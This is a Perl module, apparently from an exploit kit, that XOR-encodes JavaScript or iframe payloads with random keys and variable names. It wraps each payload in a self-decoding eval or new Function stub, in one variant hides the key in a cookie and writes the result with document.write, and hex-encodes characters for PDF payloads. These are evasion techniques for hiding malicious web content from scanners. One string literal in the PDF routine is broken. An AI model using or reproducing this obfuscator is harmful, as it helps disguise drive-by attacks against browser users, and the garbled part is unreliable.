#!/usr/bin/perl
package JsXOR;
sub excryptxorjs
{
$beforexor = shift;
$evalstring = generate_eval(int(rand 15)) . 'e' . generate_eval(int(rand 15)) . 'v' . generate_eval(int(rand 15)) . 'a' . generate_eval(int(rand 15)) . 'l' . generate_eval(int(rand 15));
$randfunc = generate_random_string(int(rand 20));
$randxplencodevar = generate_random_string(int(rand 20));
$randall = generate_random_string(int(rand 20));
$allfuncxored = "";
$word = $beforexor;
$randxor = int(rand 100);
while($randxor < 3)
{
$randxor = int(rand 100);
}
for(my $i = 0; $i < length($word); $i++)
{
$encodedxpl .= "$randfunc" . '(' . (ord(substr($word, $i, 1)) ^ $randxor) . ')+';
}
$randcomment = '/*' . generate_random_string(int(rand 100)) . '*/';
$randcomment2 = '/*' . generate_random_string(int(rand 100)) . '*/';
$allfuncxored .= "var $randxplencodevar = \"\";" . "\n";
$allfuncxored .= "var $randfunc=function($randall){$randxplencodevar += String." . $randcomment . "fromCharCode($randall\^$randxor)};" . "\n";
$allfuncxored .= "$encodedxpl" . '\'\';' . "\n";
$allfuncxored .= 'eval(' . $randxplencodevar. ');' . "\n";
return $allfuncxored;
}
sub excryptxorframe
{
$beforexor = shift;
$randfunc = generate_random_string(int(rand 20));
$randxplencodevar = generate_random_string(int(rand 20));
$randall = generate_random_string(int(rand 20));
$timenoeval = generate_random_string(int(rand 20));
$allfuncxored = "";
$word = $beforexor;
$randxor = int(rand 100);
while($randxor < 3)
{
$randxor = int(rand 100);
}
for(my $i = 0; $i < length($word); $i++)
{
$encodedxpl .= "$randfunc" . '(' . (ord(substr($word, $i, 1)) ^ $randxor) . ')+';
}
$randcomment = '/*' . generate_random_string(int(rand 100)) . '*/';
$allfuncxored .= "var $randxplencodevar = \"\";" . "\n";
$allfuncxored .= "var $randfunc=function($randall){$randxplencodevar += String." . $randcomment . "fromCharCode($randall\^$randxor)};" . "\n";
$allfuncxored .= "$encodedxpl" . '\'\';' . "\n";
$allfuncxored .= 'var ' . "$timenoeval" . ' = new Function(' . $randxplencodevar . ');' . "\n";
$allfuncxored .= "$timenoeval" . '();';
return $allfuncxored;
}
sub newxorframe
{
$iframe = shift;
$randxor = int(rand 100);
while($randxor < 3)
{
$randxor = int(rand 100);
}
$key = $randxor;
$encodedxpl = "";
for(my $i = 0; $i < length($iframe); $i++)
{
$encodedxpl .= (ord(substr($iframe, $i, 1)) ^ $key) . ', ';
}
$iframeprintout = <<EOF;
<!--
function readCookie(name) {
var nameEQ = name + "=";
var ca = document.cookie.split(';');
for(var i=0;i < ca.length;i++) {
var c = ca[i];
while (c.charAt(0)==' ') c = c.substring(1,c.length);
if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
}
return null;
}
var expires = "";
var name = "hello";
var value = $key;
document.cookie = name+"="+value+expires+"; path=/";
var dataxpl = [$encodedxpl];
var key = readCookie(name);
for (var i=0; i<dataxpl.length; i++){
var keydecoded = String.fromCharCode(dataxpl[i]^key);
document.write(keydecoded);
}
//-->
EOF
return $iframeprintout;
}
sub pdfhexencode
{
$encoded = shift;
$encodepdfchar = "";
foreach $charencoded (split //, $encoded)
{
$chaoslawnumber = int(rand(2));
if($chaoslawnumber eq 1 or $chaoslawnumber eq 2)
{
$tohoz = $charencoded;
$tohoz =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$encodepdfchar .= '
}
else
{
$encodepdfchar .= $charencoded;
}
}
return $encodepdfchar;
}
sub generate_random_string
{
my $length_of_randomstring=shift;
if($length_of_randomstring < 4)
{
$length_of_randomstring = 4
}
my @chars=('a'..'z','A'..'Z');
my $random_string;
foreach (1..$length_of_randomstring)
{
$random_string.=$chars[rand @chars];
}
return $random_string;
}
sub generate_random_number
{
my $length_of_randomstring=shift;
if($length_of_randomstring < 4)
{
$length_of_randomstring = 4
}
my @chars=('0'..'9');
my $random_string;
foreach (1..$length_of_randomstring)
{
$random_string.=$chars[rand @chars];
}
return $random_string;
}
sub generate_eval
{
my $length_of_randomstring=shift;
if($length_of_randomstring < 4)
{
$length_of_randomstring = 2
}
my @chars=('A'..'Z');
my $random_string;
foreach (1..$length_of_randomstring)
{
$random_string.=$chars[rand @chars];
}
return $random_string;
}
sub generate_random_hex_char
{
my $length_of_randomstring=shift;
if($length_of_randomstring < 4)
{
$length_of_randomstring = 2
}
my @chars=('a'..'f','0'..'9');
my $random_string;
foreach (1..$length_of_randomstring)
{
$random_string.=$chars[rand @chars];
}
return $random_string;
}
1;
